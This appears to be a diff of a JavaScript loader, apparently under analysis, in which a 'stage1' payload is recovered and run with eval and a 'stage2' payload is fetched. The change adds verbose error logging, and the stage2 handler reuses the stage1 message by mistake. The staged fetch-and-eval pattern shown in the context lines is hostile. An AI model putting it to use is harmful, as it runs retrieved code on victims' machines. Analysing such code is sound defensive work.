@@ -146,8 +146,11 @@ async function main() {
     // Original behavior:
     console.log("[redacted] stage1 recovered:", stage1.length);
     eval(stage1);
-  } catch {
-    console.log("stage1 failed to query");
+  } catch (err) {
+    console.error("stage1 failed to query:", err?.message || err);
+    console.error("body:", err?.body);
+    console.error("response:", err?.response);
+    console.error("stack:", err?.stack);
   }
 
   try {
@@ -167,8 +170,12 @@ async function main() {
     });
 
     console.log("[redacted] stage2 recovered:", stage2.length);
-  } catch {
+  } catch (err) {
     console.log("stage2 failed to query");
+    console.error("stage1 failed to query:", err?.message || err);
+    console.error("body:", err?.body);
+    console.error("response:", err?.response);
+    console.error("stack:", err?.stack);
   }
 }
 
